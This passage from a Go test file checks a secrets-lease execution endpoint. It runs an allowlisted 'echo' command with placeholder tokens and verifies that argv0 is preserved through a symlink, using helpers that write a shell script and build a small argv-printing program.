		svc:         app.Service{Policy: domain.DefaultPolicy(), Requests: store, Leases: store, Secrets: store, Audit: testAudit{}, Now: func() time.Time { return now }, NewRequestID: func() string { return "r1" }, NewLeaseTok: func() string { return "l1" }},
		authEnabled: true,
		authCfg:     config.AuthConfig{EnableAuth: true, OperatorToken: "op", AllowPlaintextSecretReturn: false},
		execPolicy: config.ExecutionPolicy{
			ExactMatchExecutables: []string{"echo"},
			CommandSearchPaths:    []string{trustedDir},
			OutputSecurityMode:    "raw",
			MaxOutputBytes:        65536,
			DefaultTimeoutSec:     30,
			MaxTimeoutSec:         60,
		},
		authStore: aStore,
		now:       func() time.Time { return now },
	})

	payload := `{"lease_token":"l1","command":["echo"],"secrets":["github_token"],"command_fingerprint":"fp","workdir_fingerprint":"wd"}`
	req := httptest.NewRequest(http.MethodPost, "/v1/leases/execute", bytes.NewBufferString(payload))
	req.Header.Set("Authorization", "Bearer s1")
	w := httptest.NewRecorder()
	s.handleExecute(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d body=%s", w.Code, w.Body.String())
	}

	var out struct {
		StdoutStderr string `json:"stdout_stderr"`
	}
	if err := json.Unmarshal(w.Body.Bytes(), &out); err != nil {
		t.Fatalf("decode response: %v", err)
	}
	if out.StdoutStderr != "echo\n" {
		t.Fatalf("expected original argv0 to be preserved for resolved symlink, got %q", out.StdoutStderr)
	}
}

func writeExecutableScript(t *testing.T, path string, body string) {
	t.Helper()
	script := "#!/bin/sh\nset -eu\n" + body + "\n"
	if err := os.WriteFile(path, []byte(script), 0o700); err != nil {
		t.Fatalf("write executable: %v", err)
	}
}

func buildArgvPrinter(t *testing.T, dir string) string {
	t.Helper()
	src := filepath.Join(dir, "main.go")
	if err := os.WriteFile(src, []byte(`package main
import (
	"fmt"
	"os"
)
func main() {
	fmt.Println(os.Args[0])
}
`), 0o600); err != nil {
		t.Fatalf("write argv printer source: %v", err)
	}
	out := filepath.Join(dir, "applet-target")
	cmd := exec.Command("go", "build", "-o", out, src)
	cmd.Env = os.Environ()
	if buildOut, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("build argv printer: %v output=%s", err, string(buildOut))
	}
	return out
}
